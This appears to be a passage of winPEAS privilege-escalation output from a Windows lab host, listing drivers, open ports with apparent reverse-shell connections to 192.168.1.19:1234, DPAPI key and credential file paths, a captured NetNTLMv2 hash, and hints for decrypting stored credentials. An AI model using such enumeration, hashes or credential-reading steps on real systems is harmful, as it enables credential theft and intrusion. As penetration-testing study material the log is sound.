    MEGASAS RAID Controller Driver for Windows - 7.710.10.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1015 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys                                                                                                                                                                     
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.1.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Pointing PS/2 Device Driver - 12.5.7.0 build-3574480 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    Intel(R) PRO/1000 Adapter - 8.4.13.0 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\E1G6032E.sys
    VMware server memory controller - 7.4.2.0 build-5980934 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys


�����������������������������������͹ Network Information �������������������������������������

����������͹ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

����������͹ Enumerate Network Mapped Drives (WMI)

����������͹ Host File

����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet[08:00:27:12:DB:24]: 192.168.1.20, fe80::4cc:3ba3:70a5:f5f4%6, fd00:5a13:793:1e00:413:7c74:2659:8a4a, fd00:5a13:793:1e00:4cc:3ba3:70a5:f5f4 / 255.255.255.0
        Gateways: 192.168.1.1
        DNSs: fe80::1%6, 192.168.1.1, 192.168.1.1
        Known hosts:
          10.0.2.1              00-00-00-00-00-00     Invalid
          192.168.1.1           00-5A-13-07-93-1E     Dynamic
          192.168.1.19          30-10-B3-22-CC-52     Dynamic
          192.168.1.255         FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


����������͹ Current TCP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                                       
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         860             C:\Windows\system32\svchost.exe
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         932             C:\Windows\system32\svchost.exe
  TCP        0.0.0.0               7680          0.0.0.0               0               Listening         1464            svchost
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         648             C:\Windows\system32\lsass.exe
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         500             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         988             C:\Windows\System32\svchost.exe
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         956             C:\Windows\system32\svchost.exe
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         1804            C:\Windows\System32\spoolsv.exe
  TCP        0.0.0.0               49672         0.0.0.0               0               Listening         632             services
  TCP        127.0.0.1             49673         127.0.0.1             49674           Established       2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        127.0.0.1             49674         127.0.0.1             49673           Established       2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        192.168.1.20          139           0.0.0.0               0               Listening         4               System
  TCP        192.168.1.20          8080          192.168.1.19          34124           Close Wait        2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        192.168.1.20          8080          192.168.1.19          57946           Established       2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        192.168.1.20          8080          192.168.1.19          58716           Close Wait        2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        192.168.1.20          49767         20.90.153.243         443             Established       956             C:\Windows\system32\svchost.exe
  TCP        192.168.1.20          49795         192.168.1.19          1234            Established       2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        192.168.1.20          49813         192.168.1.19          1234            Established       2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        192.168.1.20          49814         192.168.1.19          1234            Established       2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe

  Enumerating IPv6 connections
                                                                                                                                                                       
  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         860             C:\Windows\system32\svchost.exe
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        7680          [::]                                        0               Listening         1464            svchost
  TCP        [::]                                        8080          [::]                                        0               Listening         2020            C:\Program Files\Java\jre1.8.0_301\bin\java.exe
  TCP        [::]                                        49664         [::]                                        0               Listening         648             C:\Windows\system32\lsass.exe
  TCP        [::]                                        49665         [::]                                        0               Listening         500             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         988             C:\Windows\System32\svchost.exe
  TCP        [::]                                        49667         [::]                                        0               Listening         956             C:\Windows\system32\svchost.exe
  TCP        [::]                                        49668         [::]                                        0               Listening         1804            C:\Windows\System32\spoolsv.exe
  TCP        [::]                                        49672         [::]                                        0               Listening         632             services
  TCP        [fe80::4cc:3ba3:70a5:f5f4%6]                135           [fe80::4cc:3ba3:70a5:f5f4%6]                49919           Established       860             C:\Windows\system32\svchost.exe
  TCP        [fe80::4cc:3ba3:70a5:f5f4%6]                49666         [fe80::4cc:3ba3:70a5:f5f4%6]                49920           Established       988             C:\Windows\System32\svchost.exe
  TCP        [fe80::4cc:3ba3:70a5:f5f4%6]                49919         [fe80::4cc:3ba3:70a5:f5f4%6]                135             Established       4408            c:\Users\Public\Downloads\winpeas.exe
  TCP        [fe80::4cc:3ba3:70a5:f5f4%6]                49920         [fe80::4cc:3ba3:70a5:f5f4%6]                49666           Established       4408            c:\Users\Public\Downloads\winpeas.exe

����������͹ Current UDP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                                       
  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               500           *:*                            956               C:\Windows\system32\svchost.exe
  UDP        0.0.0.0               4500          *:*                            956               C:\Windows\system32\svchost.exe
  UDP        0.0.0.0               5050          *:*                            932               C:\Windows\system32\svchost.exe
  UDP        0.0.0.0               5353          *:*                            1248              C:\Windows\System32\svchost.exe
  UDP        0.0.0.0               5355          *:*                            1248              C:\Windows\System32\svchost.exe
  UDP        127.0.0.1             1900          *:*                            2832              C:\Windows\system32\svchost.exe
  UDP        127.0.0.1             57415         *:*                            2832              C:\Windows\system32\svchost.exe
  UDP        127.0.0.1             64470         *:*                            956               C:\Windows\system32\svchost.exe
  UDP        192.168.1.20          137           *:*                            4                 System
  UDP        192.168.1.20          138           *:*                            4                 System
  UDP        192.168.1.20          1900          *:*                            2832              C:\Windows\system32\svchost.exe
  UDP        192.168.1.20          57414         *:*                            2832              C:\Windows\system32\svchost.exe

  Enumerating IPv6 connections
                                                                                                                                                                       
  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        500           *:*                            956               C:\Windows\system32\svchost.exe
  UDP        [::]                                        4500          *:*                            956               C:\Windows\system32\svchost.exe
  UDP        [::]                                        5353          *:*                            1248              C:\Windows\System32\svchost.exe
  UDP        [::]                                        5355          *:*                            1248              C:\Windows\System32\svchost.exe
  UDP        [::1]                                       1900          *:*                            2832              C:\Windows\system32\svchost.exe
  UDP        [::1]                                       57413         *:*                            2832              C:\Windows\system32\svchost.exe
  UDP        [fe80::4cc:3ba3:70a5:f5f4%6]                1900          *:*                            2832              C:\Windows\system32\svchost.exe
  UDP        [fe80::4cc:3ba3:70a5:f5f4%6]                57412         *:*                            2832              C:\Windows\system32\svchost.exe

����������͹ Firewall Rules
� Showing only DENY rules (too many ALLOW rules always) 
  [X] Exception: Exception has been thrown by the target of an invocation.
    Current Profiles: 
  [X] Exception: Exception has been thrown by the target of an invocation.
    DENY rules:
  [X] Exception: Exception has been thrown by the target of an invocation.

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
    ...tlu.dl.delivery.mp.microsoft.com   ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   2001:1900:2332:1e01::1fe
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   2001:1900:232a:8f06::1fe
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   2001:1900:2321:1005::1fe
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   2001:1900:23ce:2::1fe
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   2001:1900:2332:300d::1fe
    ...tlu.dl.delivery.mp.microsoft.com   ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   8.238.128.126
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   8.238.183.254
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   8.238.88.248
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   8.238.124.254
    ...tlu.dl.delivery.mp.microsoft.com   ...mp.microsoft.com.c.footprint.net   8.238.124.126
    ...fficshaping.dsp.mp.microsoft.com   ...fficshaping.dsp.mp.microsoft.com   tsfe.trafficmanager.net
    ...fficshaping.dsp.mp.microsoft.com   tsfe.trafficmanager.net               20.54.110.119
    geo.prod.do.dsp.mp.microsoft.com      geo.prod.do.dsp.mp.microsoft.com      ...o.prod.do.dsp.trafficmanager.net
    geo.prod.do.dsp.mp.microsoft.com      ...o.prod.do.dsp.trafficmanager.net   ...605.prod.do.dsp.mp.microsoft.com
    geo.prod.do.dsp.mp.microsoft.com      ...605.prod.do.dsp.mp.microsoft.com   51.104.164.114
    dl.delivery.mp.microsoft.com          dl.delivery.mp.microsoft.com          ...t-nlu-fg-shim.trafficmanager.net
    dl.delivery.mp.microsoft.com          ...t-nlu-fg-shim.trafficmanager.net   ...mp.microsoft.com.c.footprint.net
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   2001:1900:23ce:c::1fe
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   2001:1900:23ce:e::1fe
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   2001:1900:23ce:2::1fe
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   2001:1900:23ce:a::1fe
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   2001:1900:23ce:4::1fe
    dl.delivery.mp.microsoft.com          dl.delivery.mp.microsoft.com          ...t-nlu-fg-shim.trafficmanager.net
    dl.delivery.mp.microsoft.com          ...t-nlu-fg-shim.trafficmanager.net   ...mp.microsoft.com.c.footprint.net
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   8.238.128.254
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   8.238.183.254
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   8.238.128.126
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   8.238.183.126
    dl.delivery.mp.microsoft.com          ...mp.microsoft.com.c.footprint.net   8.238.184.126
    ...ver.prod.do.dsp.mp.microsoft.com   ...ver.prod.do.dsp.mp.microsoft.com   ...dsp.mp.microsoft.com.edgekey.net
    ...ver.prod.do.dsp.mp.microsoft.com   ...dsp.mp.microsoft.com.edgekey.net   e10370.d.akamaiedge.net
    ...ver.prod.do.dsp.mp.microsoft.com   ...ver.prod.do.dsp.mp.microsoft.com   ...dsp.mp.microsoft.com.edgekey.net
    ...ver.prod.do.dsp.mp.microsoft.com   ...dsp.mp.microsoft.com.edgekey.net   e10370.d.akamaiedge.net
    ...ver.prod.do.dsp.mp.microsoft.com   e10370.d.akamaiedge.net               95.100.218.145
    ...tlu.dl.delivery.mp.microsoft.com   ...tlu.dl.delivery.mp.microsoft.com   tlu-dcat.azureedge.net
    ...tlu.dl.delivery.mp.microsoft.com   tlu-dcat.azureedge.net                tlu-dcat.ec.azureedge.net
    ...tlu.dl.delivery.mp.microsoft.com   tlu-dcat.ec.azureedge.net             wu.wpc.apr-52dd2.edgecastdns.net
    ...tlu.dl.delivery.mp.microsoft.com   wu.wpc.apr-52dd2.edgecastdns.net      hlb.apr-52dd2-0.edgecastdns.net
    ...tlu.dl.delivery.mp.microsoft.com   hlb.apr-52dd2-0.edgecastdns.net       cs11.wpc.v0cdn.net
    ...tlu.dl.delivery.mp.microsoft.com   cs11.wpc.v0cdn.net                    ...2800:133:672:1e5f:2264:1854:1189
    ocsp.digicert.com                     ocsp.digicert.com                     ocsp.edge.digicert.com
    ocsp.digicert.com                     ocsp.edge.digicert.com                fp2e7a.wpc.2be4.phicdn.net
    ocsp.digicert.com                     fp2e7a.wpc.2be4.phicdn.net            fp2e7a.wpc.phicdn.net
    ocsp.digicert.com                     fp2e7a.wpc.phicdn.net                 192.229.221.95
    ...601.prod.do.dsp.mp.microsoft.com   ...601.prod.do.dsp.mp.microsoft.com   ...dsp.mp.microsoft.com.edgekey.net
    ...601.prod.do.dsp.mp.microsoft.com   ...dsp.mp.microsoft.com.edgekey.net   e12358.d.akamaiedge.net
    ...601.prod.do.dsp.mp.microsoft.com   e12358.d.akamaiedge.net               95.100.216.35
    fe3cr.delivery.mp.microsoft.com       fe3cr.delivery.mp.microsoft.com       fe3.delivery.mp.microsoft.com
    fe3cr.delivery.mp.microsoft.com       fe3.delivery.mp.microsoft.com         ...prod.dcat.dsp.trafficmanager.net
    fe3cr.delivery.mp.microsoft.com       ...prod.dcat.dsp.trafficmanager.net   2603:1030:7::106
    fe3cr.delivery.mp.microsoft.com       fe3cr.delivery.mp.microsoft.com       fe3.delivery.mp.microsoft.com
    fe3cr.delivery.mp.microsoft.com       fe3.delivery.mp.microsoft.com         ...prod.dcat.dsp.trafficmanager.net
    fe3cr.delivery.mp.microsoft.com       ...prod.dcat.dsp.trafficmanager.net   13.95.31.18
    ...tlu.dl.delivery.mp.microsoft.com   ...tlu.dl.delivery.mp.microsoft.com   cds.f7y3z2w8.hwcdn.net
    ...tlu.dl.delivery.mp.microsoft.com   cds.f7y3z2w8.hwcdn.net                2001:4de0:ac10::1:1:18
    ...tlu.dl.delivery.mp.microsoft.com   ...tlu.dl.delivery.mp.microsoft.com   cds.f7y3z2w8.hwcdn.net
    ...tlu.dl.delivery.mp.microsoft.com   cds.f7y3z2w8.hwcdn.net                209.197.3.8

����������͹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        CertificateRevocation                     1
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        EnableNegotiate                           1
  HKCU        ProxyEnable                               0
  HKCU        MigrateProxy                              1
  HKCU        WarnonZoneCrossing                        0
  HKCU        LockDatabase                              132734157290955225
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps                                                                                                                                                            
  No URLs configured

  Zone Auth Settings                                                                                                                                                   
  No Zone Auth Settings


�����������������������������������͹ Windows Credentials �������������������������������������

����������͹ Checking Windows Vault
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    Not Found

����������͹ Checking Credential manager
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
Please run: 
cmdkey /list

����������͹ Saved RDP connections
    Not Found

����������͹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings                                                                                                                                                  
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

����������͹ Recently run commands
    Not Found

����������͹ Checking for DPAPI Master Keys
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\butler\AppData\Roaming\Microsoft\Protect\S-1-5-21-1875598273-2479178766-1212885099-1001\8c38ae01-3750-464d-90f3-478779448146
    Accessed: 10/19/2023 2:41:17 PM
    Modified: 8/14/2021 5:10:41 AM
   =================================================================================================

    MasterKey: C:\Users\butler\AppData\Roaming\Microsoft\Protect\S-1-5-21-1875598273-2479178766-1212885099-1001\fb4fe6ee-6c1b-48e0-aef2-460b1b235e6b
    Accessed: 10/19/2023 2:42:16 PM
    Modified: 10/19/2023 2:39:20 PM
   =================================================================================================

    MasterKey: C:\Users\butler\AppData\Roaming\Microsoft\Protect\S-1-5-21-1875598273-2479178766-1212885099-1001\feec1dfc-14e0-4e83-af1a-4fe9dbc6f0ea
    Accessed: 8/14/2021 5:13:51 AM
    Modified: 8/14/2021 4:54:14 AM
   =================================================================================================

    MasterKey: C:\Users\butler\AppData\Roaming\Microsoft\Protect\S-1-5-21-1875598273-2479178766-1212885099-1001\8c38ae01-3750-464d-90f3-478779448146
    Accessed: 10/19/2023 2:41:17 PM
    Modified: 8/14/2021 5:10:41 AM
   =================================================================================================

    MasterKey: C:\Users\butler\AppData\Roaming\Microsoft\Protect\S-1-5-21-1875598273-2479178766-1212885099-1001\fb4fe6ee-6c1b-48e0-aef2-460b1b235e6b
    Accessed: 10/19/2023 2:42:16 PM
    Modified: 10/19/2023 2:39:20 PM
   =================================================================================================

    MasterKey: C:\Users\butler\AppData\Roaming\Microsoft\Protect\S-1-5-21-1875598273-2479178766-1212885099-1001\feec1dfc-14e0-4e83-af1a-4fe9dbc6f0ea
    Accessed: 8/14/2021 5:13:51 AM
    Modified: 8/14/2021 4:54:14 AM
   =================================================================================================

� Follow the provided link for further instructions in how to decrypt the masterkey.

����������͹ Checking for DPAPI Credential Files
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: 48cece6b-6925-4257-b0fb-2402ece72e6e
    Accessed: 8/15/2021 7:27:40 PM
    Modified: 8/15/2021 5:33:14 PM
    Size: 11104
   =================================================================================================

    CredFile: C:\Users\butler\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: fb4fe6ee-6c1b-48e0-aef2-460b1b235e6b
    Accessed: 10/19/2023 2:47:07 PM
    Modified: 10/19/2023 2:47:07 PM
    Size: 11104
   =================================================================================================

    CredFile: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: 4cbad339-98cf-4d37-a896-96e33e566471
    Accessed: 10/19/2023 2:45:39 PM
    Modified: 10/19/2023 2:45:39 PM
    Size: 11104
   =================================================================================================

� Follow the provided link for further instructions in how to decrypt the creds file

����������͹ Checking for RDCMan Settings Files
� Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager                                                                                                                                                                  
    Not Found

����������͹ Looking for Kerberos tickets
�  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

����������͹ Looking for saved Wifi credentials
  [X] Exception: The service has not been started
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

����������͹ Looking AppCmd.exe
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe
    Not Found

����������͹ Looking SSClient.exe
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
    Not Found

����������͹ Enumerating SSCM - System Center Configuration Manager settings

����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    butler::BUTLER:1122334455667788:519144fe0fa494a94b5244607c533944:01010000000000000474bf7b8402da01d79bf63c6358100b0000000008003000300000000000000000000000003000008205528917806b96b6387ec36104c198760992cb853ac87b0596ab47a310e7810a00100000000000000000000000000000000000090000000000000000000000                                  
                                                                                                                                                                       
   =================================================================================================



�����������������������������������͹ Browsers Information �������������������������������������

����������͹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Looking for Firefox DBs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in Firefox history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Looking for Chrome DBs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in Chrome history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history


=== Chrome (All Users) ===
    Not Found

����������͹ Chrome bookmarks
    Not Found

����������͹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Current IE tabs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in IE history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history


����������͹ IE history -- limit 50
                                                                                                                                                                       
    http://go.microsoft.com/fwlink/p/?LinkId=255142
    http://go.microsoft.com/fwlink/p/?LinkId=255142

����������͹ IE favorites
    Not Found


�����������������������������������͹ Interesting files and registry �������������������������������������

����������͹ Putty Sessions


=== Putty Saved Session Information (All Users) ===

    Not Found

����������͹ Putty SSH Host keys


=== Putty SSH Host Hosts (All Users) ===

    Not Found

����������͹ SSH keys in registry
� If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry                                                                                                                                                       
    Not Found

����������͹ SuperPutty configuration files

����������͹ Enumerating Office 365 endpoints synced by OneDrive.
                                                                                                                                                                       
    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-1875598273-2479178766-1212885099-1001
      Name:  Personal
        UserFolder                                 C:\Users\butler\OneDrive
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


����������͹ Cloud Credentials
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

����������͹ Unattend Files

����������͹ Looking for common SAM & SYSTEM backups

����������͹ Looking for McAfee Sitelist.xml Files

����������͹ Cached GPP Passwords

����������͹ Looking for possible regs with creds
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

����������͹ Looking for possible password files in users homes
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

����������͹ Searching for Oracle SQL Developer config files
                                                                                                                                                                       

����������͹ Slack files & directories
  note: check manually if something is found

����������͹ Looking for LOL Binaries and Scripts (can be slow)
�  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

����������͹ Enumerating Outlook download files
                                                                                                                                                                       

����������͹ Enumerating machine and user certificate files
                                                                                                                                                                       

����������͹ Searching known files that can contain creds in home
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\butler\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlscert.der
    C:\Users\butler\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlskey.der

����������͹ Looking for documents --limit 100--
    Not Found

����������͹ Office Most Recent Files -- limit 50
                                                                                                                                                                       
  Last Access Date           User                                           Application           Document

����������͹ Recent files --limit 70--
   butler :

    Not Found

����������͹ Looking inside the Recycle Bin for creds files
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

����������͹ Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                                                                                       
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\butler\AppData\Local\Temp\BITA616.tmp
     C:\Users\butler\AppData\Local\Temp\BIT1E2F.tmp
     C:\Users\Default
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol

����������͹ Searching interesting files in other users home directories (can be slow)
                                                                                                                                                                       
     You are already Administrator, check users home folders manually.

����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\$Recycle.Bin\S-1-5-21-1875598273-2479178766-1212885099-500\$IIQHIPQ.exe": Administrators [AllAccess],Users [AppendData/CreateDirectories]
     File Permissions "C:\$Recycle.Bin\S-1-5-21-1875598273-2479178766-1212885099-500\$IU9AEJF.exe": Administrators [AllAccess],Users [AppendData/CreateDirectories]
     File Permissions "C:\$Recycle.Bin\S-1-5-21-1875598273-2479178766-1212885099-500\$RIQHIPQ.exe": Administrators [AllAccess],Users [AppendData/CreateDirectories]
     File Permissions "C:\$Recycle.Bin\S-1-5-21-1875598273-2479178766-1212885099-500\$RU9AEJF.exe": Administrators [AllAccess],Users [AppendData/CreateDirectories]
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": Administrators [AllAccess]
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDrive.exe": Administrators [AllAccess]
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\python3.exe": Administrators [AllAccess]
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\python.exe": Administrators [AllAccess]
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": Administrators [AllAccess]
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": Administrators [AllAccess]
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": Administrators [AllAccess]
